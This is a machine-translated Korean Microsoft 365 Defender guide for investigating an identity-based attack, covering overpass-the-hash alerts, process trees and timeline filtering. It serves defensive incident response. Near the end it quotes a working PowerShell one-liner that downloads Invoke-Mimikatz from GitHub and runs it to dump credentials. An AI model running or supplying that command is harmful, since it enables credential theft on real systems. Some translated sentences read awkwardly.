---
title: ID 기반 공격의 예
description: ID 기반 공격의 예제 분석을 진행합니다.
keywords: 인시던트, 경고, 조사, 상관 관계, 공격, 컴퓨터, 장치, 사용자, ID, ID, 사서함, 전자 메일, 365, Microsoft, m365, 인시던트 대응, 사이버 공격
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 4f15bf358d180e30ab34abff3105ba77edb6fa0d
ms.sourcegitcommit: d4b867e37bf741528ded7fb289e4f6847228d2c5
ms.translationtype: MT
ms.contentlocale: ko-KR
ms.lasthandoff: 10/06/2021
ms.locfileid: "60149839"
---
# <a name="example-of-an-identity-based-attack"></a>ID 기반 공격의 예

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**적용 대상:**
- Microsoft 365 Defender

Microsoft Defender for Identity는 조직에서 ID를 손상하려는 악의적인 시도를 감지하는 데 도움이 될 수 있습니다. ID에 대한 Defender는 Microsoft 365 Defender 통합하기 때문에 보안 분석가가 Id를 위해 Defender에서 오는 위협(예: 의심되는 Netlogon 권한 상승 시도)을 볼 수 있습니다.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Id에 대한 Microsoft Defender의 공격 분석

Microsoft 365 Defender 인시던트 페이지의 경고 탭에서 분석가가 검색 원본을 통해 경고를 필터링할 수 있습니다.  다음 예제에서는 ID에 대한 검색 원본이 **Defender로 필터링됩니다.** 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="ID에 대한 Defender에 대한 검색 원본 필터링의 예":::

의심되는 **overpass-the-hash** 공격 경고를 선택하면 자세한 정보가 Microsoft Cloud App Security 페이지로 이동합니다. 경고 유형에 대해 자세히 알아보고 공격에  대한 설명과 수정 제안을 읽으면 경고 또는 공격에 대한 자세한 정보를 언제든지 찾을 수 있습니다. [](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002)
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Overpass-the-hash 공격 경고의 예입니다."::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>끝점에 대한 Microsoft Defender에서 동일한 공격 조사

또는 분석가가 끝점용 Defender를 사용하여 끝점의 활동에 대해 자세히 배울 수 있습니다. 인시던트 큐에서 인시던트 를 선택한 다음 경고 **탭을** 선택합니다. 여기에서 검색 원본도 식별할 수 있습니다. 검색된 것으로 레이블이 EDR 끝점 검색 및 응답은 끝점용 Defender입니다. 여기에서 분석가가 검색된 경고를 EDR.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Endpoint용 Defender의 끝점 검색 및 응답 예"::: 

경고 페이지에는 영향을 미치는 장치 이름, 사용자 이름, 자동 조사 상태, 경고 세부 정보 등 다양한 관련 정보가 표시됩니다. 경고 스토리는 프로세스 트리의 시각적 표현을 나타냈습니다. 프로세스 트리는 경고와 관련된 상위 및 자식 프로세스의 계층적 표현입니다.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Endpoint용 Defender의 경고 프로세스 트리 예제입니다."::: 

각 프로세스를 확장하여 추가 세부 정보를 볼 수 있습니다. 분석가가 볼 수 있는 세부 정보는 악의적인 스크립트, 아웃바운드 연결 IP 주소 및 기타 유용한 정보의 일부로 입력된 실제 명령입니다.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Endpoint용 Defender의 프로세스 세부 정보 예제입니다.":::
 
시간 표시 **막대에서 참조를** 선택하면 분석가가 드릴다운을 추가하여 정확한 손상 시간을 확인할 수 있습니다. 

끝점용 Microsoft Defender는 여러 악성 파일 및 스크립트를 검색할 수 있습니다. 그러나 아웃바운드 연결, PowerShell 및 명령줄 활동에는 합법적인 사용이 많기 때문에 악의적인 파일이나 활동을 생성하기 전까지는 일부 활동이 무해한 것으로 간주됩니다. 따라서 타임라인을 사용하면 분석가가 주변 활동과 함께 경고를 컨텍스트에 배치하여 일반적인 파일 시스템 및 사용자 활동으로 가려진 원래 공격의 원본이나 시간을 확인할 수 있습니다. 

이를 위해 분석가가 경고 검색 시(빨간색)에 시작하고 뒤로 스크롤하여 악의적인 활동을 주도한 원래 활동이 실제로 시작된 시기를 파악합니다. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="경고 검색 시 시작 예제입니다."::: 

Windows 업데이트 연결, Windows 신뢰할 수 있는 소프트웨어 정품 인증 트래픽, Microsoft 사이트에 대한 기타 일반적인 연결, 타사 인터넷 활동, Microsoft Endpoint Configuration Manager 활동 및 기타 무해한 활동과 같은 일반적인 활동을 이해하고 구분해야 합니다. 이렇게 하는 한 가지 방법은 시간 표시 막대 필터를 사용하는 것입니다. 분석가가 보지 않을 모든 것을 필터링하는 동안 특정 활동을 강조할 수 있는 많은 필터가 있습니다. 

아래 이미지에서 분석가가 네트워크 및 처리 이벤트만 보기 위해 필터링했습니다. 이를 통해 분석가가 IP 주소와의 연결을 설정한 이벤트와 메모장 네트워크 연결 및 프로세스를 볼 수 있습니다. 프로세스 트리에서도 볼 수 있습니다. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="악의적인 아웃바운드 연결을 메모장 방법을 예로 들 수 있습니다."::: 

이 특정 이벤트에서는 메모장 아웃바운드 연결을 만드는 데 사용됩니다. 그러나 일반적으로 iexplorer.exe 웹 브라우저 활동으로 간주되어 공격자는 단순히 iexplorer.exe 사용하여 악의적인 페이로드를 다운로드하기 위한 연결을 설정하기만 합니다.

타임라인에서 찾아야 할 또 다른 항목은 아웃바운드 연결에 PowerShell이 사용하는 것입니다. 분석가가 악성 파일을 호스팅하는 웹 사이트에 대한 아웃바운드 연결과 같은 명령을 사용하여 성공적인 PowerShell 연결을 `IEX (New-Object Net.Webclient)` 찾아야 합니다. 

다음 예제에서는 PowerShell을 사용하여 웹 사이트에서 Mimikatz를 다운로드하고 실행했습니다.

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
분석가가 검색 표시줄에 키워드를 입력하여 PowerShell로 만든 이벤트만 표시하면 키워드를 빠르게 검색할 수 있습니다. 

## <a name="next-step"></a>다음 단계

피싱 [조사 경로를](first-incident-path-phishing.md) 참조합니다.

## <a name="see-also"></a>참고 항목

- [인시던트 개요](incidents-overview.md)
- [인시던트 관리](manage-incidents.md)
- [인시던트 조사](investigate-incidents.md)
